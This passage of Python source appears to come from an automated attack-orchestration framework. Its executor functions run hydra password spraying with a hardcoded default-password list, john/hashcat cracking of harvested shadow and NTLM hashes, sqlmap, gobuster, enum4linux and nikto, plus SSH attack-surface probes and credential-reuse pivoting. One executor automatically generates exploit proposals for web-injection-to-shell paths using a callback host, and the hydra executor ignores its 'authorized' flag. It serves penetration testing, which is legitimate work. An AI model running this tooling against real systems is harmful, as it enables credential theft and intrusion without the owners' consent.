                            wicket="HO-10", ctype="ntlm_hash")
                events.append(make_event("HO-03","realized",0.99,
                    f"NTLM hash recovered for {_hm.group(1)}"))

    if not events:
        # At minimum we have code execution
        events.append(make_event("HO-10","realized",0.70,"Shell obtained — code execution confirmed"))

    with open(events_file, "w") as fh:
        for ev in events:
            fh.write(ev)

    print(f"    [POST-EXP] {ip}: {len(events)} wicket events from session")
    for ev in events:
        d = json.loads(ev)
        print(f"      {d['payload']['wicket_id']} {d['payload']['status']} — {d['payload']['detail'][:60]}")

    result["success"] = True
    result["events"] = len(events)
    result["events_file"] = str(events_file)
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception:
        pass
    _project_gravity_events(events_file, run_id, result)
    return result

def _exec_http_collector(ip, target, run_id, out_dir, result):
    """Run the web collector."""
    from urllib.parse import urlparse as _urlparse
    web_ports = target.get("web_ports", [])
    if not web_ports:
        # Infer from services
        for svc in target.get("services", []):
            if svc["service"] in ("http", "https", "http-alt", "https-alt"):
                scheme = "https" if "https" in svc["service"] else "http"
                web_ports.append((svc["port"], scheme))

    # If ip is already a URL, extract port/scheme from it
    if not web_ports and ip.startswith(("http://", "https://")):
        try:
            _parsed = _urlparse(ip)
            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
            web_ports.append((_port, _parsed.scheme))
        except Exception:
            pass

    if not web_ports:
        result["error"] = "No web service discovered on target yet — run nmap first"
        result["success"] = False
        return result

    for port, scheme in web_ports[:2]:
        _host = _strip_url_scheme(ip)
        if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
            url = f"{scheme}://{_host}"
        else:
            url = f"{scheme}://{_host}:{port}"
        events_file = out_dir / f"gravity_http_{ip}_{port}.ndjson"
        try:
            from skg_services.gravity.web_runtime import collect_surface_events_to_file

            events = collect_surface_events_to_file(
                url,
                out_path=events_file,
                attack_path_id="web_sqli_to_shell_v1",
                run_id=run_id,
                workload_id=f"web::{ip}",
                timeout=8.0,
            )

            # Stamp target_ip into every event for cross-file filtering.
            for ev in events:
                if not isinstance(ev, dict):
                    continue
                payload = ev.get("payload")
                if not isinstance(payload, dict):
                    payload = {}
                    ev["payload"] = payload
                payload["target_ip"] = ip

            content = ""
            if events:
                content = "\n".join(json.dumps(ev) for ev in events) + "\n"
            events_file.write_text(content, encoding="utf-8")

            # Mirror to EVENTS_DIR so FoldDetector and daemon sensor loop can also read these observations.
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            mirror = EVENTS_DIR / events_file.name
            mirror.write_text(content, encoding="utf-8")

            if events:
                _project_gravity_events(events_file, run_id, result)
                realized = sum(
                    1
                    for ev in events
                    if (ev.get("payload", {}) or {}).get("status") == "realized"
                )
                result["unknowns_resolved"] = int(result.get("unknowns_resolved", 0)) + realized

            result["events_file"] = str(events_file)
            result["success"] = True
        except Exception as e:
            result["error"] = str(e)

    return result


def _exec_auth_scanner(ip, target, run_id, out_dir, result):
    """Run authenticated web runtime through canonical service wrappers."""
    from urllib.parse import urlparse as _urlparse
    web_ports = []
    for svc in target.get("services", []):
        if svc["service"] in ("http", "https", "http-alt", "https-alt"):
            scheme = "https" if "https" in svc["service"] else "http"
            web_ports.append((svc["port"], scheme))

    # If ip is already a URL, extract port/scheme from it
    if not web_ports and ip.startswith(("http://", "https://")):
        try:
            _parsed = _urlparse(ip)
            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
            web_ports.append((_port, _parsed.scheme))
        except Exception:
            pass

    if not web_ports:
        result["error"] = "No web service discovered on target yet — run nmap first"
        result["success"] = False
        return result

    # Load per-target web credentials from targets.yaml
    username = None
    password = None
    targets_file = _config_file("targets.yaml")
    if targets_file.exists():
        try:
            import yaml as _yaml
            data = _yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip or t.get("url", "").find(ip) >= 0:
                    auth = t.get("auth", {})
                    username = auth.get("user") or t.get("web_user")
                    password = auth.get("password") or t.get("web_password")
                    break
        except Exception:
            pass

    for port, scheme in web_ports[:1]:
        host = _strip_url_scheme(ip)
        if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
            url = f"{scheme}://{host}"
        else:
            url = f"{scheme}://{host}:{port}"
        events_file = out_dir / f"gravity_auth_{ip}_{port}.ndjson"
        try:
            from skg_services.gravity.web_runtime import collect_auth_surface_events_to_file

            events = collect_auth_surface_events_to_file(
                url,
                out_path=events_file,
                attack_path_id="web_sqli_to_shell_v1",
                run_id=run_id,
                workload_id=f"web::{ip}",
                username=str(username or ""),
                password=str(password or ""),
                try_defaults=True,
                timeout=10.0,
            )

            for ev in events:
                if not isinstance(ev, dict):
                    continue
                payload = ev.get("payload")
                if not isinstance(payload, dict):
                    payload = {}
                    ev["payload"] = payload
                payload["target_ip"] = ip

            content = ""
            if events:
                content = "\n".join(json.dumps(ev) for ev in events) + "\n"
            events_file.write_text(content, encoding="utf-8")

            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            mirror = EVENTS_DIR / events_file.name
            mirror.write_text(content, encoding="utf-8")

            if events:
                _project_gravity_events(events_file, run_id, result)
                realized_count = sum(
                    1
                    for ev in events
                    if (ev.get("payload", {}) or {}).get("status") == "realized"
                )
                result["unknowns_resolved"] = int(result.get("unknowns_resolved", 0)) + realized_count

            result["events_file"] = str(events_file)
            result["success"] = True

            # Auto-generate exploit proposals when high-value findings confirmed
            # Don't wait for MSF to be gradient-selected -- act on confirmed findings now
            try:
                states = load_wicket_states(ip)
                realized = [w for w, s in states.items() if s.get("status") == "realized"]
                high_value = {"WB-09", "WB-14", "WB-10", "WB-20"}
                confirmed = [w for w in realized if w in high_value]
                if confirmed:
                    from exploit_dispatch import generate_exploit_proposals, _get_lhost as _dispatch_lhost
                    lhost = _get_lhost()
                    for path_id in ["web_cmdi_to_shell_v1", "web_sqli_to_shell_v1"]:
                        try:
                            props = generate_exploit_proposals(
                                path_id=path_id,
                                target_ip=ip,
                                port=port,
                                realized_wickets=realized,
                                lhost=lhost,
                                out_dir=out_dir,
                            )
                            if props:
                                print(f"    [EXPLOIT] {len(props)} proposal(s) generated for {path_id}")
                        except Exception:
                            pass
            except Exception:
                pass

        except Exception as e:
            result["error"] = str(e)

    return result


def _exec_process_probe(ip, target, run_id, out_dir, result):
    """
    Process exploit surface — ptrace_scope, user namespaces, eBPF,
    ASLR, SUID, executable stack, shared memory, cron writability.

    Requires SSH access to the target. Reads credentials from the
    credential store (tries msfdb then local store).
    """
    sys.path.insert(0, str(REPO_ROOT))
    try:
        from skg.sensors.process_probe import probe_process_surface
    except Exception as e:
        result["error"] = f"process_probe import failed: {e}"
        return result

    creds = _load_ssh_creds_for_ip(ip)
    if not creds:
        result["error"] = "No SSH credentials available for process_probe"
        result["skipped"] = True
        return result

    events_file = out_dir / f"process_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    try:
        events = probe_process_surface(
            target_ip=ip,
            ssh_user=creds.get("user", "root"),
            ssh_key=creds.get("key_path"),
            ssh_password=creds.get("password"),
            out_file=events_file,
        )
        result["success"] = True
        result["events"] = len(events)
        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
        if events_file.exists():
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception as e:
        result["error"] = str(e)
    return result


def _exec_boot_probe(ip, target, run_id, out_dir, result):
    """
    Boot/firmware attack surface — UEFI mode, Secure Boot, EFI variables,
    TPM, GRUB protection, kernel lockdown, cmdline flags.

    Requires SSH access. Boot surface is only meaningful on Linux targets.
    """
    sys.path.insert(0, str(REPO_ROOT))
    try:
        from skg.sensors.boot_probe import probe_boot_surface
    except Exception as e:
        result["error"] = f"boot_probe import failed: {e}"
        return result

    # Only run on Linux hosts
    os_guess = (target.get("os") or "").lower()
    if "windows" in os_guess:
        result["skipped"] = True
        result["error"] = "boot_probe: Windows target — use separate Windows boot audit"
        return result

    creds = _load_ssh_creds_for_ip(ip)
    if not creds:
        result["error"] = "No SSH credentials available for boot_probe"
        result["skipped"] = True
        return result

    events_file = out_dir / f"boot_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    try:
        events = probe_boot_surface(
            target_ip=ip,
            ssh_user=creds.get("user", "root"),
            ssh_key=creds.get("key_path"),
            ssh_password=creds.get("password"),
            out_file=events_file,
        )
        result["success"] = True
        result["events"] = len(events)
        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
        if events_file.exists():
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception as e:
        result["error"] = str(e)
    return result


def _exec_gpu_probe(ip, target, run_id, out_dir, result):
    """
    GPU / compute attack surface.

    Two-phase:
    1. Network phase (no auth required): probe compute API ports
    2. SSH phase (if creds available): check device files, IOMMU, OpenCL ICD,
       MPS server, GPU process list, driver version → CVE match

    The network phase runs unconditionally — GPU compute APIs exposed to the
    network are a first-class attack vector regardless of SSH access.
    """
    sys.path.insert(0, str(REPO_ROOT))
    try:
        from skg.sensors.gpu_probe import probe_gpu_surface
    except Exception as e:
        result["error"] = f"gpu_probe import failed: {e}"
        return result

    creds = _load_ssh_creds_for_ip(ip)  # may be None — network phase still runs
    events_file = out_dir / f"gpu_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    try:
        events = probe_gpu_surface(
            target_ip=ip,
            ssh_user=(creds or {}).get("user", "root"),
            ssh_key=(creds or {}).get("key_path"),
            ssh_password=(creds or {}).get("password"),
            out_file=events_file,
        )
        result["success"] = True
        result["events"] = len(events)
        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
        if events_file.exists():
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception as e:
        result["error"] = str(e)
    return result


def _exec_cognitive_probe(ip, target, run_id, out_dir, result):
    """
    AI/LLM metacognition attack surface.

    Probes LLM subjects (configured in skg_config.yaml under cognitive_probe:)
    for MC-01..MC-08 metacognitive preconditions:
      - Confidence calibration (ECE)
      - Spontaneous/directed error detection
      - Known-unknown discrimination
      - Strategy revision on failure
      - Confidence updating on evidence
      - Uncertainty propagation
      - Overconfidence on novel domains

    Only runs for AI-domain targets. Requires:
      - cognitive_probe.subject_endpoint set in target config, OR
      - target has ai_present=True and an endpoint accessible on known LLM ports
    """
    sys.path.insert(0, str(REPO_ROOT))

    # Resolve subject config from target or global config
    ai_cfg = target.get("cognitive_probe") or {}
    if not ai_cfg:
        # Try global config
        try:
            import yaml
            global_cfg_path = REPO_ROOT / "config" / "skg_config.yaml"
            if global_cfg_path.exists():
                gcfg = yaml.safe_load(global_cfg_path.read_text())
                ai_cfg = gcfg.get("cognitive_probe") or {}
        except Exception:
            pass

    if not ai_cfg:
        result["error"] = "cognitive_probe: no config found (set cognitive_probe: in skg_config.yaml or target)"
        return result

    # Inject target IP if api_base not explicitly set
    if "api_base" not in ai_cfg:
        port = ai_cfg.get("port", 11434)
        ai_cfg["api_base"] = f"http://{ip}:{port}"

    probe_set = ai_cfg.get("probe_set")
    if not probe_set:
        # Use bundled default catalog probes
        default_probe = REPO_ROOT / "skg-metacognition-toolchain" / "contracts" / "catalogs" / "default_probes.yaml"
        if default_probe.exists():
            ai_cfg["probe_set"] = str(default_probe)
        else:
            result["error"] = "cognitive_probe: no probe_set configured and no default probes found"
            return result

    ai_cfg.setdefault("collect_interval_s", 0)
    ai_cfg.setdefault("subject_id", ai_cfg.get("model", ip))
    ai_cfg.setdefault("workload_id", f"ai::{ip}")
    ai_cfg.setdefault("domain", "metacognition")

    try:
        from skg.sensors.cognitive_sensor import CognitiveSensor
        sensor = CognitiveSensor(cfg=ai_cfg, events_dir=out_dir)
        out_files = sensor.run()
        result["success"] = True
        result["events_files"] = out_files
        result["events"] = len(out_files)
        # Copy events to global EVENTS_DIR
        for fp in out_files:
            src = Path(fp)
            if src.exists():
                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
                (EVENTS_DIR / src.name).write_text(src.read_text())
    except Exception as e:
        result["error"] = f"cognitive_probe: {e}"
    return result


def _load_ssh_creds_for_ip(ip: str) -> Optional[dict]:
    """
    Load SSH credentials for a target IP from the credential store.
    Returns dict with 'user', 'password'/'key_path' or None.
    """
    cred_file = SKG_STATE_DIR / "credentials.jsonl"
    if not cred_file.exists():
        return None
    for line in cred_file.read_text().splitlines():
        try:
            cred = json.loads(line)
            if cred.get("target_ip") == ip and cred.get("protocol") in ("ssh", "winrm"):
                result: dict = {"user": cred.get("username", "root")}
                if cred.get("key_path"):
                    result["key_path"] = cred["key_path"]
                elif cred.get("password"):
                    result["password"] = cred["password"]
                return result
        except Exception:
            continue
    return None


def _exec_web_struct_fetch(ip, target, run_id, out_dir, result):
    """
    Structured data fetcher — probes wellknown JSON/JSONL/XML/YAML endpoints.

    Domain agnostic: works against any HTTP target.  Emits WB-30..WB-40 wickets
    for OpenAPI schemas, config exposure, debug endpoints, credentials in
    structured responses, internal IP leakage, XMLRPC, version disclosure, etc.

    This instrument is directed by the same gravity physics as every other
    instrument: it is selected when the WB-30..WB-40 wavelength has unknown
    wickets.  No special-casing required.
    """
    from skg.sensors.struct_fetch import fetch_and_ingest

    # Determine base URLs to probe.  Supports http/https and custom ports.
    services = target.get("services", [])
    http_ports: list[tuple[str, int]] = []
    for svc in services:
        port = svc.get("port", 0)
        name = (svc.get("service") or svc.get("name") or "").lower()
        if port in (80, 8080, 8000, 8008, 8009, 3000) or "http" in name:
            http_ports.append(("http", port))
        elif port in (443, 8443, 9443) or "https" in name:
            http_ports.append(("https", port))
    # Fallback: always try port 80
    if not http_ports:
        http_ports = [("http", 80)]

    workload_id = f"web::{ip}"
    events_file = out_dir / f"gravity_struct_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    all_events: list[dict] = []

    for scheme, port in http_ports[:3]:  # cap at 3 ports
        base_url = f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"
        try:
            events, probed = fetch_and_ingest(
                base_url=base_url,
                target_ip=ip,
                workload_id=workload_id,
                run_id=run_id,
            )
            all_events.extend(events)
            if probed:
                print(f"    [STRUCT] {ip}:{port} — probed {len(probed)} endpoints, "
                      f"{len(events)} events")
        except Exception as exc:
            print(f"    [STRUCT] {ip}:{port} — error: {exc}")

    if not all_events:
        result["success"] = True
        result["events"] = 0
        return result

    with open(events_file, "w") as fh:
        for ev in all_events:
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in all_events if e.get("payload", {}).get("status") == "realized")
    b = sum(1 for e in all_events if e.get("payload", {}).get("status") == "blocked")
    print(f"    [STRUCT] {ip}: {len(all_events)} events ({r}R {b}B)")

    result["success"] = True
    result["events"] = len(all_events)
    result["events_file"] = str(events_file)
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
    except Exception:
        pass
    _project_gravity_events(events_file, run_id, result)
    return result


def _try_instrument_pivot(node_key: str, ip: str, target_row: dict,
                           failed_result: dict, instruments: dict,
                           run_id: str, out_dir: Path) -> None:
    """
    Pivot logic: when an instrument fails, try alternative approaches.

    - SSH auth failure -> check credential store for password spray
    - HTTP 401/403 -> try different auth methods
    - SMB access denied -> try null session or alternate credentials
    - Shell gained -> trigger internal network discovery
    """
    error = str(failed_result.get("error", "")).lower()
    instrument = str(failed_result.get("instrument", ""))

    # SSH auth failure -> try credential store
    if instrument == "ssh_sensor" and ("auth" in error or "authentication" in error):
        try:
            import sys as _sys
            _sys.path.insert(0, str(Path(__file__).parent))
            from cred_reuse import CredentialStore
            store = CredentialStore()
            creds = store.for_target(ip)
            if creds:
                print(f"    \u2194 PIVOT: SSH auth failed, trying {len(creds)} stored credentials")
                # cred_reuse instrument will pick these up on next cycle
                if _state_db is not None:
                    for c in creds[:5]:
                        _state_db.add_credential(
                            node_key, "ssh",
                            port=22,
                            username=c.get("user", ""),
                            secret=c.get("secret", ""),
                            source="credential_reuse_pivot",
                        )
        except Exception:
            pass

    # Post-exploit: if shell was gained, trigger internal network discovery
    if failed_result.get("session_id") or failed_result.get("got_shell"):
        print(f"    \u2194 PIVOT: Shell on {node_key} -- scheduling internal network discovery")
        # Mark target for internal scan on next cycle
        if _state_db is not None:
            _state_db.add_pivot_target(node_key, ip, method="post_exploit_shell")


def _find_web_port_for_target(target: dict) -> int | None:
    """
    Extract web port from target dict.

    Returns None when no web service has been discovered yet — callers must
    check for None and skip execution rather than assuming port 80.
    Assuming port 80 is open creates false observations on non-web targets.
    """
    services = target.get("target", {}).get("services", []) or target.get("services", []) or []
    for svc in services:
        if svc.get("service") in ("http", "https", "http-alt", "https-alt", "http-proxy"):
            try:
                return int(svc["port"])
            except Exception:
                pass
    # Also accept any port that looks like a web port by number
    web_ports = {80, 443, 8080, 8443, 8000, 8008, 8009, 8888}
    for svc in services:
        try:
            if int(svc.get("port", 0)) in web_ports:
                return int(svc["port"])
        except Exception:
            pass
    return None  # No web service discovered; do not assume


def _web_port_from_ip_or_target(ip: str, target: dict) -> int | None:
    """
    Determine the web port to use for web instruments (gobuster, nikto, etc.).

    Checks in order:
    1. If ip is a URL (http:// or https://), extract port from it directly.
    2. Fall back to _find_web_port_for_target(target) which inspects services.
    """
    from urllib.parse import urlparse as _urlparse
    if ip.startswith(("http://", "https://")):
        try:
            parsed = _urlparse(ip)
            if parsed.port:
                return parsed.port
            return 443 if parsed.scheme == "https" else 80
        except Exception:
            pass
    return _find_web_port_for_target(target)


def _ingest_events_to_kernel(events: list[dict], target_ip: str) -> None:
    """Ingest a list of obs.attack.precondition events directly into the kernel."""
    try:
        for ev in events:
            payload = ev.get("payload", {})
            if payload.get("type") == "obs.attack.precondition" or ev.get("type") == "obs.attack.precondition":
                _kernel.ingest_event(ev)
    except Exception as exc:
        log.debug(f"[ingest] {target_ip}: {exc}")


def _exec_hydra(ip: str, target: dict, run_id: str, out_dir: Path, result: dict,
                authorized: bool = False) -> dict:
    """
    Execute hydra credential brute-force against discovered auth services.

    Strategy:
    - Prioritises harvested credentials from CredentialStore (from prior enum4linux/ssh runs)
    - Supplements with a small default credential list (common defaults, not rockyou)
    - Targets SSH, FTP, SMB, and HTTP basic/form auth in order of discovery
    - Stops after the first valid credential pair per service (hydra -f)
    - Stores found credentials back into CredentialStore for cred_reuse to propagate
    """
    import re as _re
    import subprocess as _sp
    import sys as _sys

    services = target.get("target", {}).get("services", []) or []

    def _port_for(*names_or_ports):
        for s in services:
            p = s.get("port", 0)
            n = str(s.get("service", "")).lower()
            for v in names_or_ports:
                if isinstance(v, int) and p == v:
                    return p
                if isinstance(v, str) and v in n:
                    return p
        return None

    ssh_port = _port_for(22, "ssh")
    ftp_port = _port_for(21, "ftp")
    smb_port = _port_for(445, 139, "smb")
    web_port = _find_web_port_for_target(target)

    if not any([ssh_port, ftp_port, smb_port, web_port]):
        result["error"] = "No auth services discovered yet — run nmap first"
        result["success"] = False
        return result

    # Harvest existing credentials from store
    harvested_users: list[str] = []
    harvested_passes: list[str] = []
    try:
        _sys.path.insert(0, str(Path(__file__).parent))
        from cred_reuse import CredentialStore as _CS
        _cs = _CS()
        for cred in (_cs.for_target(ip) or []):
            u = cred.get("user", "")
            s = cred.get("secret", "")
            if u and u not in harvested_users:
                harvested_users.append(u)
            if s and s not in harvested_passes:
                harvested_passes.append(s)
    except Exception:
        pass

    # Default credential pairs — common defaults only, not a wordlist
    default_users = ["admin", "root", "user", "administrator", "test", "guest",
                     "ubuntu", "pi", "oracle", "postgres", "vagrant", "anonymous"]
    default_passes = ["admin", "password", "123456", "root", "admin123", "letmein",
                      "toor", "changeme", "welcome", "pass", "test", "guest",
                      "qwerty", "abc123", "raspberry", "ubuntu", "password1",
                      "default", "12345", "", "admin@123", "P@ssw0rd"]

    # Merge: harvested first (more likely to succeed)
    user_list = harvested_users + [u for u in default_users if u not in harvested_users]
    pass_list = harvested_passes + [p for p in default_passes if p not in harvested_passes]

    user_file = out_dir / f"hydra_users_{run_id[:8]}.txt"
    pass_file = out_dir / f"hydra_passes_{run_id[:8]}.txt"
    user_file.write_text("\n".join(user_list[:30]))
    pass_file.write_text("\n".join(pass_list[:40]))

    out_file = out_dir / f"gravity_hydra_{ip.replace('.','_')}_{run_id}.ndjson"
    found_creds: list[tuple[str, str, str, int]] = []

    def _run_hydra_service(svc_name: str, port: int) -> list[tuple[str, str]]:
        log_txt = out_dir / f"hydra_{svc_name}_{ip.replace('.','_')}_{run_id[:8]}.txt"
        cmd = [
            "hydra",
            "-L", str(user_file),
            "-P", str(pass_file),
            "-t", "4",   # polite thread count
            "-s", str(port),
            "-o", str(log_txt),
            "-f",        # stop at first valid pair
            ip, svc_name,
        ]
        try:
            proc = _sp.run(cmd, capture_output=True, text=True, timeout=120)
            output = proc.stdout + proc.stderr
        except Exception as exc:
            log.debug(f"[hydra] {svc_name}:{port} on {ip}: {exc}")
            return []
        found = []
        for line in output.splitlines():
            m = _re.search(r"host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(.*)", line)
            if m:
                found.append((m.group(1), m.group(2).strip()))
        return found

    services_tested = []
    if ssh_port:
        for u, p in _run_hydra_service("ssh", ssh_port):
            found_creds.append((u, p, "ssh", ssh_port))
        services_tested.append(f"ssh:{ssh_port}")
    if ftp_port:
        for u, p in _run_hydra_service("ftp", ftp_port):
            found_creds.append((u, p, "ftp", ftp_port))
        services_tested.append(f"ftp:{ftp_port}")
    if smb_port:
        for u, p in _run_hydra_service("smb", smb_port):
            found_creds.append((u, p, "smb", smb_port))
        services_tested.append(f"smb:{smb_port}")

    events = []
    if found_creds:
        # Store found creds for cross-surface reuse
        try:
            from cred_reuse import CredentialStore as _CS
            _cs = _CS()
            for u, p, svc, port in found_creds:
                _cs.add(u, p, ip, cred_type="password", origin_ip=ip)
        except Exception:
            pass

        wicket_map = {"ssh": "HO-02", "ftp": "HO-02", "smb": "WB-19", "http": "WB-08"}
        for u, p, svc, port in found_creds:
            wid = wicket_map.get(svc, "HO-02")
            domain = "host" if svc in ("ssh", "ftp", "smb") else "web"
            events.append(envelope(
                event_type="obs.attack.precondition",
                source_id="skg.gravity.hydra",
                toolchain=domain,
                payload=precondition_payload(
                    wicket_id=wid,
                    label=f"credential found: {u}@{svc}:{port}",
                    domain=domain,
                    workload_id=f"{domain}::{ip}",
                    realized=True,
                    detail=f"hydra: {u} authenticated on {svc}:{port}",
                ),
                evidence_rank=1,
                source_kind="hydra",
                confidence=0.95,
            ))

        _ingest_events_to_kernel(events, ip)
        with out_file.open("w") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")
        result["found_credentials"] = len(found_creds)
        result["events_file"] = str(out_file)

    result["success"] = True
    result["unknowns_resolved"] = len(found_creds)
    result["services_tested"] = services_tested
    return result


def _exec_john(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
    """
    Execute John the Ripper (or hashcat) against harvested hashes.

    Looks for hash files written by enum4linux, ssh_sensor, or other instruments
    in out_dir and DISCOVERY_DIR, then cracks them offline.  Cracked credentials
    are injected back into CredentialStore for cred_reuse propagation.
    """
    import subprocess as _sp
    import re as _re
    import shutil as _sh
    import sys as _sys

    # Collect hash files from this run and recent discovery output
    hash_files = []
    for pattern in [
        f"*hashes*{ip.replace('.','_')}*",
        f"*ntlm*{ip.replace('.','_')}*",
        f"*shadow*{ip.replace('.','_')}*",
        f"*passwd*{ip.replace('.','_')}*",
    ]:
        hash_files.extend(out_dir.glob(pattern))
        hash_files.extend(DISCOVERY_DIR.glob(pattern))

    if not hash_files:
        result["error"] = "No hash files found — run enum4linux or ssh_sensor first"
        result["success"] = False
        return result

    # Prefer john; fall back to hashcat
    cracker = _sh.which("john") or _sh.which("hashcat")
    if not cracker:
        result["error"] = "Neither john nor hashcat available"
        result["success"] = False
        return result

    cracked: list[tuple[str, str]] = []
    out_file = out_dir / f"gravity_john_{ip.replace('.','_')}_{run_id}.ndjson"

    for hash_file in hash_files[:5]:  # limit to 5 files
        cracked_txt = out_dir / f"john_cracked_{hash_file.stem}_{run_id[:8]}.txt"
        try:
            if "john" in cracker:
                cmd = [cracker, str(hash_file), "--wordlist=/usr/share/wordlists/rockyou.txt",
                       f"--pot={cracked_txt}"]
            else:
                cmd = [cracker, "-a", "0", str(hash_file), "/usr/share/wordlists/rockyou.txt",
                       "-o", str(cracked_txt)]

            proc = _sp.run(cmd, capture_output=True, text=True, timeout=300)
            output = proc.stdout + proc.stderr

            # Parse john output: "password          (username)"
            for line in output.splitlines():
                m = _re.match(r"^(\S.*?)\s+\((\S+)\)", line)
                if m:
                    cracked.append((m.group(2), m.group(1)))
        except Exception as exc:
            log.debug(f"[john] {hash_file.name}: {exc}")

    if cracked:
        try:
            _sys.path.insert(0, str(Path(__file__).parent))
            from cred_reuse import CredentialStore as _CS
            _cs = _CS()
            for user, pwd in cracked:
                _cs.add(user, pwd, ip, cred_type="password", origin_ip=ip)
        except Exception:
            pass

        events = []
        for user, pwd in cracked:
            events.append(envelope(
                event_type="obs.attack.precondition",
                source_id="skg.gravity.john",
                toolchain="host",
                payload=precondition_payload(
                    wicket_id="HO-03",
                    label=f"hash cracked: {user}",
                    domain="host",
                    workload_id=f"host::{ip}",
                    realized=True,
                    detail=f"john cracked hash for {user}",
                ),
                evidence_rank=1,
                source_kind="john",
                confidence=0.90,
            ))
        _ingest_events_to_kernel(events, ip)
        with out_file.open("w") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")
        result["cracked_hashes"] = len(cracked)
        result["events_file"] = str(out_file)

    result["success"] = True
    result["unknowns_resolved"] = len(cracked)
    return result


def _exec_gobuster(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
    """Execute gobuster web directory enumeration."""
    port = _web_port_from_ip_or_target(ip, target)
    if port is None:
        result["error"] = "No web service discovered on target yet — run nmap first"
        result["success"] = False
        return result
    host = _strip_url_scheme(ip)
    scheme = "https" if port in (443, 8443) else "http"
    # Use standard port notation (omit :80 or :443) to avoid redirect issues
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        url = f"{scheme}://{host}"
    else:
        url = f"{scheme}://{host}:{port}"
    out_file = out_dir / f"gravity_gobuster_{ip.replace('.','_')}_{run_id}.ndjson"
    try:
        from skg_services.gravity.web_runtime import collect_gobuster_events_to_file
        events = collect_gobuster_events_to_file(url, out_path=out_file)
        result["events_file"] = str(out_file)
        result["unknowns_resolved"] = len([e for e in events
            if e.get("payload",{}).get("status") == "realized"])
        if events:
            _ingest_events_to_kernel(events, ip)
    except Exception as exc:
        log.warning(f"[gobuster] {ip}: {exc}")
        # Fallback: run gobuster directly via subprocess
        try:
            import subprocess as _sp
            wordlist = "/usr/share/wordlists/dirb/common.txt"
            if not Path(wordlist).exists():
                wordlist = "/usr/share/dirb/wordlists/common.txt"
            if not Path(wordlist).exists():
                result["error"] = "gobuster adapter and wordlist not found"
                return result
            out_txt = out_dir / f"gobuster_{ip.replace('.','_')}_{run_id[:8]}.txt"
            gb_cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-o", str(out_txt), "-q", "--no-error"]
            proc = _sp.run(gb_cmd, capture_output=True, text=True, timeout=120)
            discovered = [line.split()[0] for line in (proc.stdout or "").splitlines()
                          if line.startswith("/")]
            if discovered:
                result["success"] = True
                result["unknowns_resolved"] = len(discovered)
        except Exception as exc2:
            log.warning(f"[gobuster-fallback] {ip}: {exc2}")
    return result


def _exec_sqlmap(ip: str, target: dict, run_id: str, out_dir: Path,
                 result: dict, authorized: bool = False) -> dict:
    """Execute sqlmap SQL injection testing."""
    if not authorized:
        result["skipped"] = True
        result["skip_reason"] = "sqlmap requires --authorized flag"
        return result
    port = _find_web_port_for_target(target)
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"
    try:
        from skg_services.gravity.web_runtime import collect_sqlmap_events_to_file
        _sqlmap_out = out_dir / f"sqlmap_events_{run_id}.ndjson"
        events = collect_sqlmap_events_to_file(url, out_path=_sqlmap_out)
        result["events_file"] = str(_sqlmap_out)
        result["unknowns_resolved"] = len([e for e in events
            if e.get("payload",{}).get("status") == "realized"])
        if events:
            _ingest_events_to_kernel(events, ip)
    except Exception as exc:
        log.warning(f"[sqlmap] {ip}: {exc}")
    return result


def _exec_enum4linux(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
    """Execute enum4linux SMB/AD enumeration."""
    try:
        from skg_services.gravity.host_runtime import collect_enum4linux_events_to_file
        # Pass any known credentials from CredentialStore
        username, password = "", ""
        try:
            import sys as _sys
            _sys.path.insert(0, str(Path(__file__).parent))
            from cred_reuse import CredentialStore as _CS
            store = _CS()
            for cred in store.for_target(ip):
                username = cred.get("user", "")
                password = cred.get("secret", "")
                break
        except Exception:
            pass
        _e4l_out = out_dir / f"enum4linux_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
        events = collect_enum4linux_events_to_file(
            ip, out_path=_e4l_out, username=username, password=password
        )
        result["unknowns_resolved"] = len([e for e in events
            if e.get("payload",{}).get("status") == "realized"])
        if events:
            _ingest_events_to_kernel(events, ip)
    except Exception as exc:
        log.warning(f"[enum4linux] {ip}: {exc}")
    return result


def _exec_nikto(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
    """Execute nikto web vulnerability scan."""
    port = _web_port_from_ip_or_target(ip, target)
    if port is None:
        result["error"] = "No web service discovered on target yet — run nmap first"
        result["success"] = False
        return result
    host = _strip_url_scheme(ip)
    scheme = "https" if port in (443, 8443) else "http"
    # Nikto accepts hostname:port or full URLs; use hostname:port for clarity
